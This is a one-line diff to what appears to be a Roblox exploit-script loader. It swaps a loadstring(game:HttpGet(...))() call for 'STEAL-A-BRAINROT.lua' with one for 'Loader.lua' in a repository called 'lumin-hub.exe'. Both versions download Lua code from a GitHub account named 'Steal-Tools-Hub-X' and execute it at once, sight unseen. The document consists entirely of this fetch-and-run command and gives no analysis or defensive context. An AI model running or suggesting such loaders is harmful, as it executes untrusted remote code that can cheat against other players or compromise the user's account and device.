@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Steal-Tools-Hub-X/Steal-Tool-Hub-X/refs/heads/main/STEAL-A-BRAINROT.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Steal-Tools-Hub-X/lumin-hub.exe/refs/heads/main/Loader.lua",true))()
